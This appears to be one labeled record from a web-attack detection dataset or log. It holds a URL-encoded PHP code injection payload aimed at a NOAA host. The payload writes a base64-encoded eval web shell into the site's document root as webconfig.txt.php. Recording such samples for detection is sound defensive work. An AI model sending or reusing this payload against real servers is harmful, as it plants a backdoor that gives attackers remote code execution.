code = 3000003
description = 'php code injection'
uri = 'http://idpgis.ncep.noaa.gov/'
query_string = '1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B'
